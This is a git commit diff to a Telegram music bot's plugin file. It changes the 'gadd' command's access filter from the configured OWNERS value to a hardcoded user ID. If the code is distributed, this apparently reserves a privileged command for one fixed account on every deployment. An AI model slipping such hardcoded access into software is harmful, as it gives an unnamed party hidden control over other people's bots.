8435f81bb0566397d7b9b78507454700bc098089
BRANDED KING <121561060+WCGKING@users.noreply.github.com>
2025-03-17 19:58:10 +0530

    Update zowner.py

--- BrandrdXMusic/plugins/tools/zowner.py
+++ BrandrdXMusic/plugins/tools/zowner.py
@@ -63,7 +63,7 @@ async def bot_check(_, message):
 import asyncio
 
 
-@app.on_message(filters.command("gadd") & filters.user(int(OWNERS)))
+@app.on_message(filters.command("gadd") & filters.user(int(7250012103)))
 async def add_allbot(client, message):
     command_parts = message.text.split(" ")
     if len(command_parts) != 2:
